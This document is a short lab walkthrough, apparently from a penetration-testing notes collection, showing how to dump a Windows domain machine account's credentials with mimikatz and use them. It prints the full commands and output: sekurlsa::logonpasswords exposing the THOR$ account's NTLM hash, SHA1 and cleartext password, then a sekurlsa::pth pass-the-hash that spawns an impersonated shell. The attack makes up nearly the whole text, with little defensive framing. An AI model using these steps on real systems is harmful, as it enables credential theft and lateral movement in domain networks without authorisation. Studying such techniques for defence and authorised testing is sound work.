
# Machine Domain admin-Use machine NTLM hash

	We need Local Admin rights on machine

	PS C:\Users\testuser\Desktop\mimikatz\x64> whoami
	thor\win7
	PS C:\Users\testuser\Desktop\mimikatz\x64> net user win7
	Kullanıcı adı                         win7
	Tam ad
	Açıklama
	Kullanıcı açıklaması
	Ülke kodu                             (null)
	Hesap etkin                           Evet
	Hesap zaman aşımı                     Asla

	Parolanın son ayarlanmadı             12.08.2021 23:35:30
	Parola süre sonu                      23.09.2021 23:35:30
	Değişebilir parola                    13.08.2021 23:35:30
	Parola gerekli                        Hayır
	Kullanıcı parolayı değiştirebilir     Evet

	İzin verilen iş istasyonları          Tümü
	Oturum açma kodu
	Kullanıcı profili
	Ana dizin
	Son oturum açma                       14.08.2021 13:08:24

	İzin verilen oturum açma saatleri     Tümü

	Yerel Grup Üyeliği                    *Administrators
										  *Users
	Genel Grup üyeliği                    *None
	Komut başarıyla tamamlandı.


Use mimikatz and read machine NTLM hash

	Using 'Machine_hash.txt' for logfile : OK

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 996 (00000000:000003e4)
	Session           : Service from 0
	User Name         : THOR$
	Domain            : VALHALLA
	Logon Server      : (null)
	Logon Time        : 14.08.2021 01:02:17
	SID               : S-1-5-20
		msv :	
		 [00000003] Primary
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * NTLM     : f7e21314c3fb5d1c48a2d9d5b42b552c
		 * SHA1     : 9ec0546cae764e724a6348ada07efd896ab76458
		tspkg :	
		wdigest :	
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		kerberos :	
		 * Username : thor$
		 * Domain   : VALHALLA.LOCAL
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		ssp :	
		credman :	


Pash-the-Hash machine NTLM hash and spawn a CMD


	mimikatz # sekurlsa::pth /user:thor$ /domain:valhalla.loal /ntlm:f7e21314c3fb5d1c48a2d9d5b42b552c
	user	: thor$
	domain	: valhalla.loal
	program	: cmd.exe
	impers.	: no
	NTLM	: f7e21314c3fb5d1c48a2d9d5b42b552c
	  |  PID  1152
	  |  TID  752
	  |  LSA Process is now R/W
	  |  LUID 0 ; 2116305 (00000000:00204ad1)
	  \_ msv1_0   - data copy @ 000000000184D290 : OK !
	  \_ kerberos - data copy @ 000000000185DD68
	   \_ aes256_hmac       -> null             
	   \_ aes128_hmac       -> null             
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 00000000018FEF78 (16) -> null


![image](https://user-images.githubusercontent.com/13157446/129442879-3f6bdbfe-b0c9-45ed-8ed6-39331d5f2a77.png)

regular cmd shell (access denied)

![image](https://user-images.githubusercontent.com/13157446/129442954-661ab321-9c6b-4a35-9d6f-48e21d0821d1.png)
